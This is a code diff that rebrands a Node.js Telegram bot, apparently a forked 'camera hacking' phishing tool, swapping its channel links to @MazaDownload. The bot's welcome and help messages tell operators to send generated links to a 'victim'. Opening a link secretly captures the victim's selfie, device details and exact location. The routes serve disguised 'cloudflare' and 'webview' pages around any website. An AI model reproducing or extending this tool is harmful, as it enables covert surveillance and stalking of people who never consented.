@@ -30,7 +30,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/TechieGamer");
+res.redirect("https://t.me/Mazadownload");
 }
 
          
@@ -48,7 +48,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/TechieGamer");
+res.redirect("https://t.me/Mazadownload");
 }
 
          
@@ -71,14 +71,14 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou Can Use This Bot To Camera Hacking Bot People Just Through A Simple Link.\n\nIt Can Gather Informations Like Location , Device Info, Camera Snaps.\n\n If You Want To Create Your Bot Like This Then Watch Tutorial From Here @TechieGamer\n\nJoin @TechieGamer for more tool.\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou Can Use This Bot To Phone Hacking Bot People Just Through A Simple Link.\n\nIt Can Gather Informations Like Location , Device Info, Camera Snaps.\n\n If You using this bot make sure follow us Here @mazadownload\n\nJoin @MazaDownload for more tool.\n\nType /help for more info.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
 bot.sendMessage(chatId,`Click On Start Button Then Click On Create\n\nThen Send Any Website Link To Bot.\n\nThen Bot Send You Some Links Copy Any 1 Link And Send To Victim\n\nWhen Victim Open The Link Then You Will Get His Selfie, Mobile Info & If His Mobile Location Is On Then You Will Get His Exact Location Of Google Maps\n\n(⚠️ Many Sites May Not Work Under This Method If They Have X-frame Header Present.Ex https://google.com)
-\n\nJoin Telegram Channel: https://t.me/TechieGamer
+\n\nJoin Telegram Channel: https://t.me/Mazadownload
 `);
 }
   
@@ -131,11 +131,11 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @TechieGamer\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @MazaDownload\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
 }
 else{
 
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @TechieGamer\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
+bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\n\nURL: ${msg}\n\n💢 Join Telegram Channel @MazaDownload\n\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
 }
 }
 else{
